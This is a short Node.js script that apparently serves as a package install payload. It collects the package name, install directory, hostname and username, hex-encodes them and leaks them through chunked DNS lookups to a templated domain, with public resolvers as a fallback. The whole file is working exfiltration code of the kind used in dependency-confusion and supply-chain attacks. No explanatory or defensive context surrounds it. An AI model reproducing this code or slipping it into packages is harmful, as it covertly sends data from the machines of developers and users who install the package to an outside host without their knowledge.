const os = require("os");
const dns = require("dns");
const { Resolver } = require('node:dns');
const packageJSON = require("./package.json");
const package = packageJSON.name;

domain = "{{.DNS}}"
const trackingData = JSON.stringify({
    p: package,
    c: __dirname,
    h: os.hostname(),
    d: os.userInfo().username,
});

function getRandomInt(min, max) {
    const minCeiled = Math.ceil(min);
    const maxFloored = Math.floor(max);
    return Math.floor(Math.random() * (maxFloored - minCeiled) + minCeiled); // The maximum is exclusive and the minimum is inclusive
}

let strHex = [...trackingData].map((c,_i)=>c.charCodeAt(0).toString(16)).join("");
let hexArray = strHex.match(/.{1,60}/g);

id_1 = getRandomInt(36**12,(36**13)-1).toString(16);
id_2 = getRandomInt(36**12,(36**13)-1).toString(16);

const resolver = new Resolver();
resolver.setServers(['77.88.8.7', '8.8.8.8']);

for (let i = 0; i < hexArray.length; i++) {
    let queryStr = 'v2_f.'+ i + '.' + id_1 + '.' + hexArray[i] + '.' + 'v2_e' + '.' + domain;
    dns.lookup(queryStr, (err, _address, _family) => {
        if (err !== null) {
            queryStr = 'v2_f.'+ i + '.' + id_2 + '.' + hexArray[i] + '.' + 'v2_e' + '.' + domain;
            resolver.resolve4(queryStr, (_err, _addresses) => {});
        }
    });
}

